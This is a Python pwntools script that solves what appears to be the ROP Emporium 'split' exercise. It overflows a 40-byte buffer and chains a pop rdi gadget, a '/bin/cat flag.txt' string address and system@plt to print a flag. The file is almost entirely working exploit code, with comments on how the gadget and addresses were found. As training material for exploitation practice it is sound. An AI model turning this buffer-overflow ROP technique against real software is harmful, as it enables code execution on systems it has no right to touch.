#!/usr/bin/env python3

from pwn import *

binary = ELF("./split")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 40
POP_RDI = p64(0x00000000004007c3)
BIN_CAT_FLAG_ADDR = p64(0x00601060)
SYSTEM_CALL_ADDR = p64(0x400560)

rop.raw(b"A"*OFFSET)            # junk: RIP offset
rop.raw(POP_RDI)                # rop rdi: ROPgadget --binary split | grep rdi 
rop.raw(BIN_CAT_FLAG_ADDR)      # cat addr: rabin2 -z split
rop.raw(SYSTEM_CALL_ADDR)       # system@plt: objdump -d split | grep system@plt 

# chain: junk + pop rdi + cat address + system@plt
p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
